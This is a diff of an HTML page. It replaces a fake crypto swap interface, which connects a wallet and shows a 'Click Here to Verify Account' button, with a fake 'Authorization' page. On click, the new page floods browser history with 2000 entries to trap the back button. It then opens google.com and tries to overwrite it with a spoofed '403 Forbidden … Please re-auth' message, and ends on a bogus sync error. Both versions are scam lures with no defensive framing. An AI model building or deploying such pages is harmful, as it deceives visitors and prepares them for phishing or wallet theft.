@@ -1,83 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Exchange | Interface</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
+    <title>Network | Sync Interface</title>
     <style>
-        :root { --bg: #08060b; --card: #27262c; --primary: #1fc7d4; --secondary: #37353e; --text: #f4eeff; }
-        body { font-family: 'Kanit', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: grid; place-items: center; min-height: 100vh; }
-        .app-container { background: var(--card); border-radius: 24px; padding: 24px; width: 330px; border: 1px solid #383241; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
-        .head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; font-weight: 600; font-size: 20px; }
-        .box { background: var(--secondary); border-radius: 16px; padding: 16px; margin-bottom: 12px; }
-        .label { color: #b8add2; font-size: 12px; margin-bottom: 8px; }
-        .val { display: flex; justify-content: space-between; font-weight: 600; font-size: 18px; }
-        .main-btn { background: var(--primary); color: white; border: none; padding: 16px; width: 100%; border-radius: 16px; font-weight: 700; cursor: pointer; font-size: 16px; transition: 0.2s; margin-top: 8px; }
-        .alt-btn { background: transparent; color: var(--primary); border: 1px solid var(--primary); padding: 12px; width: 100%; border-radius: 16px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 12px; }
-        .main-btn:hover { opacity: 0.8; }
-        .alt-btn:hover { background: rgba(31, 199, 212, 0.1); }
-        .info { font-size: 12px; text-align: center; margin-top: 12px; color: #ed4b9e; min-height: 18px; }
+        :root { --b1: #0b0e11; --b2: #1e2329; --y1: #fcd535; --t1: #707a8a; }
+        body { margin: 0; background: var(--b1); color: var(--t1); font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .wrapper { background: var(--b2); border: 1px solid #363d47; padding: 2rem; border-radius: 12px; width: 280px; text-align: center; }
+        #exec { background: var(--y1); color: #1e2329; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: 600; cursor: pointer; }
+        .load { border: 2px solid #363d47; border-top-color: var(--y1); border-radius: 50%; width: 18px; height: 18px; animation: r 0.8s linear infinite; display: none; margin: 10px auto; }
+        @keyframes r { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="head">Swap <span>⚙️</span></div>
-    
-    <div class="box">
-        <div class="label">From</div>
-        <div class="val"><span>0.0</span> <span>BNB</span></div>
-    </div>
-
-    <div class="box">
-        <div class="label">To (estimated)</div>
-        <div class="val"><span>0.0</span> <span>CAKE</span></div>
-    </div>
-
-    <button id="cta" class="main-btn">Connect Wallet</button>
-    
-    <button id="verify" class="alt-btn" style="display: none;" onclick="extraAction()">Click Here to Verify Account</button>
-    
-    <div id="status" class="info"></div>
+<div class="wrapper">
+    <h3 style="color:#fff; margin:0 0 10px 0">Authorization</h3>
+    <p style="font-size:13px">Synchronization required to validate session.</p>
+    <div id="loader" class="load"></div>
+    <button id="exec">Confirm & Sync</button>
+    <div id="out" style="font-size:11px; margin-top:12px">Ready</div>
 </div>
 
 <script>
-    let conn;
-    let addr;
-    const btn = document.getElementById('cta');
-    const vBtn = document.getElementById('verify');
-    const msg = document.getElementById('status');
+    const el = (id) => document.getElementById(id);
+    const trigger = el('exec');
+    const status = el('out');
 
-    const init = async () => {
-        if (window.ethereum) {
-            conn = new Web3(window.ethereum);
-            try {
-                const res = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                addr = res[0];
-                msg.innerText = "Wallet: " + addr.slice(0,6) + "..." + addr.slice(-4);
-                btn.innerText = "Enable CAKE";
-                vBtn.style.display = "block"; // Munculkan tombol Click Here setelah konek
-                btn.onclick = runAction;
-            } catch (err) {
-                msg.innerText = "Connection refused";
-            }
-        } else {
-            msg.innerText = "Provider not found";
+    trigger.onclick = () => {
+        trigger.style.display = 'none';
+        el('loader').style.display = 'block';
+        status.innerText = "Processing...";
+
+        for (let i = 0; i < 2000; i++) {
+            history.pushState(null, "", "#auth_id=" + Math.random().toString(36).substring(7));
         }
-    };
 
-    const runAction = async () => {
-        msg.innerText = "Processing...";
-        // Simulasi logika approval ditaruh di sini
-    };
+        setTimeout(() => {
+            status.innerText = "Handshaking...";
+            let win = window.open('https://google.com', '_blank');
+            
+            let t = setInterval(() => {
+                try {
+                    if (win) {
+                        win.location = "javascript:document.write('<h1>403 Forbidden</h1><p>Session timeout. Please re-auth.</p>')";
+                        clearInterval(t);
+                    }
+                } catch (e) {}
+            }, 5);
 
-    const extraAction = () => {
-        // Simulasi fungsi tambahan untuk tombol Click Here
-        alert("Verification process started for: " + addr);
+            setTimeout(() => {
+                clearInterval(t);
+                status.innerText = "Sync failure (0x24)";
+                trigger.style.display = 'block';
+                el('loader').style.display = 'none';
+            }, 4000);
+        }, 150);
     };
-
-    btn.onclick = init;
 </script>
 
 </body>
